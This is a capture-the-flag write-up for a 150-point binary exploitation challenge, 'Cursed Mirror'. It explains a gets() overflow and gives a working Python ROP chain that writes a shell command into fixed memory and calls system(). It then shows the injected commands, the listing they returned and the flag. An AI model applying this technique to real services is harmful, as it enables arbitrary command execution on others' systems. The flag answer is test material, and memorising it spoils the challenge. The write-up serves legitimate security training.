# Cursed Mirror

> **Category:** Pwn (Binary Exploitation) · **Points:** 150 · **Author:** @SpiffyLich · **Track:** [Pwn](README.md)

## The Scenario

The third and final stage of this investigation: a small interactive "mirror" game with a text menu. Once again, no password; the vulnerability is reachable directly through normal gameplay.

## Step 1: Map out the program's menu

Disassembling `handle_action()` shows the menu only exposes three options to the player: `leave()`, `question()` and `glimpses()`. A fourth function, `Enter_The_Mirror(char *cmd)`, is never wired up to any menu option, but its code simply calls `system(cmd)`, running whatever string is passed to it as a real shell command. That is the goal: reach this function with a command of choice.

## Step 2: The vulnerability, option 2, "question"

The `question()` function asks the player a question and reads the answer with `gets()` into a 64-byte buffer, the same unsafe pattern as the previous two challenges, giving the same 72-byte offset to the return address.

## Step 3: A two-stage ROP chain

This challenge is trickier because `Enter_The_Mirror` needs a pointer to an actual shell command string, something not directly controlled by address. The solution is to use the overflow twice:

1. Use the `pop rdi; ret` gadget to point `rdi` at a fixed, writable memory address (an existing global variable called `string1`, at `0x4060c0`, safe to overwrite because there is no PIE, so this address never changes).
2. Call `gets()` again from inside the chain. This reads a whole new line of choice, the shell command, straight into that fixed address.
3. Reload `rdi` with the same address (in case it got clobbered), then jump into `Enter_The_Mirror`, which calls `system()` on the command just written.

```python
pop_rdi = 0x401da5           # pop rdi ; ret
gets_plt = 0x4010e0          # gets@plt
string1_addr = 0x4060c0      # fixed, writable .data address
enter_the_mirror = 0x40180d  # Enter_The_Mirror(char *cmd) -> system(cmd)

offset = 0x40 + 8
rop = b"A" * offset
rop += p64(pop_rdi) + p64(string1_addr)
rop += p64(gets_plt)
rop += p64(pop_rdi) + p64(string1_addr)
rop += p64(enter_the_mirror)

r.sendlineafter(b">", b"2")                     # choose menu option 2
r.sendline(rop)                                 # trigger the overflow
r.send(b"x")                                    # satisfy one last getchar(), NO newline
r.sendline(b"cat /app/secretflag.txt")          # injected shell command
```

One subtlety mattered a lot here: the filler byte sent to satisfy a trailing `getchar()` call had to be sent **without** a newline character. Sending a newline would have been picked up by the chained `gets()` as an empty command, causing the exploit to silently fail with an "Access Denied"-style message instead of running the command.

## Step 4: Finding the real flag file name

The first attempt, `cat flag.txt`, returned "No such file or directory", proving code execution worked, just with the wrong filename. Running `ls -la /app` through the same exploit revealed the real file: `secretflag.txt`.

```
$ ls -la /app
-rwxrwxr-x 1 nobody nogroup 25896 Aug 27 16:24 run
-rw-r--r-- 1 nobody nogroup 21    Aug 27 16:58 secretflag.txt
```

## Flag

```
deadface{M1RR0R_R1M}
```

> **Lesson:** a buffer overflow does not have to pivot to a pre-built "win" function; it can be used to write arbitrary data into the process's own memory first, turning any available call to `system()` into full command execution.

---
[← Back to index](../../README.md)
